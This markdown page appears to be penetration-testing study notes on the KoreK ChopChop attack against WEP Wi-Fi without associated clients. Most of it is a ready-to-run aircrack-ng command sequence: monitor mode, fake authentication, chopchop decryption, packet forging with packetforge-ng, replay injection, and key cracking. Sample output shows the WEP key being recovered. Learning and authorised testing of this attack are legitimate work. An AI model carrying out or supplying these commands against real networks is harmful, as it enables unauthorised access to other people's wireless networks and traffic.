# Korek ChopChop Attack (Clientless) (WEP)

This attack, when successful, can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP. This attack does not recover the WEP key itself, but merely reveals the plaintext. However, some access points are not vulnerable to this attack. Some may seem vulnerable at first but actually drop data packets shorter that 60 bytes. If the access point drops packets shorter than 42 bytes, aireplay tries to guess the rest of the missing data, as far as the headers are predictable. If an IP packet is captured, it additionally checks if the checksum of the header is correct after guessing the missing parts of it. This attack requires at least one WEP data packet.

## Commands

* Run [setup](../../setup.md) first
* Three terminals are needed
* NO clients associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack with prolonged reassociation timing (every 60 secs)
sudo aireplay-ng --fakeauth 60 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# [Terminal Three]
sudo aireplay-ng --chopchop -b $BSSID -h $INTERFACEMAC $INTERFACE

# Wait for 'Use this packet y' then enter y
# Wait for a loooong time to reach 100% done.
# It's possible to use less than 100% but risky
# Look for a replay_dec-*.xor file

# Forge a fake packet, -l source, -k destination
sudo packetforge-ng -0 -a $BSSID -h $INTERFACEMAC -l 255.255.255.255 -k 255.255.255.255 -y replay_dec-0613-175215.xor -w inject.cap

# Check veracity of file
tcpdump -n -vvv -e -s0 -r inject.cap

reading from file inject.cap, link-type IEEE802_11 (802.11), snapshot length 65535
17:55:05.191216 Protected 258us BSSID:AA:BB:CC:DD:EE:FF SA:FF:EE:DD:CC:BB:AA DA:ff:ff:ff:ff:ff:ff Data IV:5cbca Pad 0 KeyID 0

# Run the interactive attack against the client
sudo aireplay-ng --interactive -r inject.cap $INTERFACE

# Watch for the data to explode in size with lots of IVs :)
# If successful, data should get large
# Stop everything

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng -0 $PCAP
```

* View the output for the success message

```
Reading packets, please wait...
Opening wifu-01.cap
Read 441431 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  wifu                      WEGot 74852 out of 70000 IVsStarting PTW attack with 74852 ivs.
                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )
ChoosingDecrypted correctly: 100%
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* [KoreK ChopChop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop)
* [ChopChop Theory](https://www.aircrack-ng.org/doku.php?id=chopchoptheory)
* [Learning Thing](https://www.youtube.com/watch?v=2mrmqF4P0DM&ab_channel=learningthing)
